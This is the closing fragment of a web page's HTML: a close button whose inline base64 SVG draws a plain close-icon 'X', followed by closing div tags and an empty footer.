				                                            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTEiIGhlaWdodD0iMjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19jbG9zZTwvdGl0bGU+PHBhdGggZD0iTTEgMy45OTlsNC41IDQuNSA0LjUtNC41IDEgMS00LjUgNC41IDQuNSA0LjVzLS45NTcgMS4wNTEtMSAxYy0xLjIyNi0xLjQ0OS00LjUtNC41LTQuNS00LjVsLTQuNSA0LjUtMS0xIDQuNS00LjUtNC41LTQuNSAxLTF6IiBmaWxsPSIjNTU1Ii8+PC9zdmc+">
				                                        </button>
				                                    </div>
				                                </div>
				                            </div>
				                        </div>
				                    </div>
				                </div>
				            </div>
				        </div>
				    </div>
				</div>

					
			
		
	
	</div>
	
</section>

<footer class="row">
	<div class="table tds-footer">
		
		
		</ul>
	</div>
</footer>


</div>






</body></html>